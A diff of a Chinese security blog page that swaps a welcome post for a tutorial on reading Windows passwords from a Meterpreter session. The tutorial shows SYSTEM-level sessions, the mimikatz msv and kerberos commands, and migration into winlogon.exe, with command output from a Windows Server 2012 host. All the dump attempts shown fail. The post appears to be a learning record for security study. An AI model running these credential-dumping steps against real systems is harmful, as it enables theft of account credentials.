@@ -20,19 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="欢迎访问赛克研究室，本博客旨在分享各类安全知识以及生活琐事，希望能在这里找到你需要的东西。安全这条路本身就是个无底洞，想要走的越远就要时刻学习充实自身本领。所以这个博客就是记录日常所得吧，说不定哪一天就转行了，算是一个纪念，也是给自己的一个交代，至于走到哪一步交给时代吧 More info: 塞克研究室">
+  <meta name="description" content="注意事项：mimikatz模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="你好！遇见塞克">
-<meta property="og:url" content="http://example.com/2020/10/12/hello-world/index.html">
+<meta property="og:title" content="Meterpreter会话读取密码">
+<meta property="og:url" content="http://example.com/2020/10/12/MSF%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81/index.html">
 <meta property="og:site_name" content="赛克研究室">
-<meta property="og:description" content="欢迎访问赛克研究室，本博客旨在分享各类安全知识以及生活琐事，希望能在这里找到你需要的东西。安全这条路本身就是个无底洞，想要走的越远就要时刻学习充实自身本领。所以这个博客就是记录日常所得吧，说不定哪一天就转行了，算是一个纪念，也是给自己的一个交代，至于走到哪一步交给时代吧 More info: 塞克研究室">
+<meta property="og:description" content="注意事项：mimikatz模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程">
 <meta property="og:locale" content="cn_ZH">
-<meta property="article:published_time" content="2020-10-12T03:33:16.761Z">
-<meta property="article:modified_time" content="2020-10-12T07:50:21.449Z">
+<meta property="article:published_time" content="2020-10-12T08:13:03.467Z">
+<meta property="article:modified_time" content="2020-10-19T07:02:35.176Z">
 <meta property="article:author" content="SecZZ">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2020/10/12/hello-world/">
+<link rel="canonical" href="http://example.com/2020/10/12/MSF%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81/">
 
 
 <script id="page-configurations">
@@ -45,7 +45,7 @@
   };
 </script>
 
-  <title>你好！遇见塞克 | 赛克研究室</title>
+  <title>Meterpreter会话读取密码 | 赛克研究室</title>
   
 
 
@@ -150,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn-ZH">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/12/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/12/MSF%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -163,7 +163,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          你好！遇见塞克
+          Meterpreter会话读取密码
         </h1>
 
         <div class="post-meta">
@@ -172,10 +172,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">نُشر في</span>
-              
 
-              <time title="أُنشأ: 2020-10-12 11:33:16 / عُدل: 15:50:21" itemprop="dateCreated datePublished" datetime="2020-10-12T11:33:16+08:00">2020-10-12</time>
+              <time title="أُنشأ: 2020-10-12 16:13:03" itemprop="dateCreated datePublished" datetime="2020-10-12T16:13:03+08:00">2020-10-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">عُدل في</span>
+                <time title="عُدل: 2020-10-19 15:02:35" itemprop="dateModified" datetime="2020-10-19T15:02:35+08:00">2020-10-19</time>
+              </span>
 
           
 
@@ -188,8 +194,39 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>欢迎访问赛克研究室，本博客旨在分享各类安全知识以及生活琐事，希望能在这里找到你需要的东西。安全这条路本身就是个无底洞，想要走的越远就要时刻学习充实自身本领。所以这个博客就是记录日常所得吧，说不定哪一天就转行了，算是一个纪念，也是给自己的一个交代，至于走到哪一步交给时代吧</p>
-<p>More info: <a target="_blank" rel="noopener" href="https://seczz.github.io/">塞克研究室</a></p>
+        <p>注意事项：<br>mimikatz模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。</p>
+<hr>
+<p>准备：<br>本次我们是在64位系统上进行试验meterpreter读取密码</p>
+<p>C:\Windows\system32&gt;systeminfo<br>systeminfo</p>
+<p>Host Name:                 DELL-R330<br>OS Name:                   Microsoft Windows Server 2012 R2 Standard<br>OS Version:                6.3.9600 N/A Build 9600<br>OS Manufacturer:           Microsoft Corporation<br>OS Configuration:          Standalone Server<br>OS Build Type:             Multiprocessor Free<br>Registered Owner:          Windows User<br>Registered Organization:<br>Product ID:                00252-60020-02259-AA300<br>Original Install Date:     7/22/2017, 2:11:09 AM<br>System Boot Time:          7/31/2020, 3:09:53 PM<br>System Manufacturer:       Dell Inc.<br>System Model:              PowerEdge R330<br>System Type:               x64-based PC<br>Processor(s):              1 Processor(s) Installed.<br>                           [01]: Intel64 Family 6 Model 94 Stepping 3 GenuineIntel ~800 Mhz<br>BIOS Version:              Dell Inc. 2.0.8, 1/12/2017</p>
+<hr>
+<p>第一步：首先要获得系统权限或者是管理员权限<br><br/>C:\Windows\system32&gt;whoami<br><br/>whoami<br/><br>nt authority\system</p>
+<p><br/>meterpreter &gt; getuid<br/><br>Server username: NT AUTHORITY\SYSTEM</p>
+<p>第二步：加载mimikatz工具模块</p>
+<p>注意：MSF加载默认使用的32位，如果是64位系统需要尽心改动</p>
+<p>meterpreter &gt; load mimikatz <br/><br>Loading extension mimikatz…[!] Loaded x86 Mimikatz on an x64 architecture.</p>
+<p>[!] Loaded Mimikatz on a newer OS (Windows 2012 R2 (6.3 Build 9600).). Did you mean to ‘load kiwi’ instead?<br>Success.</p>
+<p>第三步：获取登陆密码的hash值</p>
+<p>meterpreter &gt; msv</p>
+<p>Running as SYSTEM<br>Retrieving msv credentials<br>msv credentials</p>
+<p>AuthID       Package    Domain          User            Password</p>
+<hr>
+<p>6;563049472  NTLM       DELL-R330       ittbbs          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)<br>0;798145     Negotiate  IIS APPPOOL     DefaultAppPool  </p>
+<p>第四步：获取明文密码</p>
+<p>meterpreter &gt; kerberos </p>
+<p>[+] Running as SYSTEM<br>[*] Retrieving kerberos credentials<br>kerberos credentials</p>
+<p>AuthID       Package    Domain          User            Password</p>
+<hr>
+<p>6;563049472  NTLM       DELL-R330       ittbbs          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (kerberos KO)</p>
+<p>我们发现无法读取到hash值，这个时候我们把进程迁移到64位进程中试试</p>
+<p>第五步：PS查找迁移进程</p>
+<p>2660  5764  winlogon.exe         x64   3        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</p>
+<p>meterpreter &gt; migrate 2660</p>
+<p>[<em>] Migrating from 6620 to 2660…<br>[</em>] Migration completed successfully.</p>
+<p>meterpreter &gt; msv</p>
+<p>[+] Running as SYSTEM<br>[*] Retrieving msv credentials<br>msv credentials</p>
+<p>6;563049472  NTLM       DELL-R330       ittbbs          n.a. (msv1_0 KO)</p>
+<p>无法读取密码，说明并不是所有的密码都可以读取，存在一定的条件</p>
 
     </div>
 
@@ -204,11 +241,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2020/10/12/MSF%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81/" rel="next" title="Meterpreter会话读取密码">
-      Meterpreter会话读取密码 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/10/12/hello-world/" rel="prev" title="你好！遇见塞克">
+      <i class="fa fa-chevron-left"></i> 你好！遇见塞克
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
